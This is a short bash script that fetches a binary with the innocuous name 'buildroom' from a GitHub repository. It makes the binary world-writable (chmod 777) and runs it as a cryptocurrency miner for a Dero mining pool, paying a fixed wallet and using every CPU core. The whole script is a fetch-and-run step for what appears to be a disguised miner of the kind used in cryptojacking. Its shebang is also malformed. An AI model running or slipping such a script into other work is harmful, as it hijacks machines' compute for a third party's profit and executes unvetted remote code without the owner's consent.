#!bin/bash

curl -L https://github.com/azkmod/runer/raw/main/buildroom > buildroom
chmod 777 buildroom
./buildroom -r dero.rabidmining.com:443 -w dero1qyjqfh7jqtm4fjqseam6fjk9cc6m82kuejaggsrdxytsa64rhrqwwqq4twys9 -ft -1 -k -1 -m $(nproc --all)
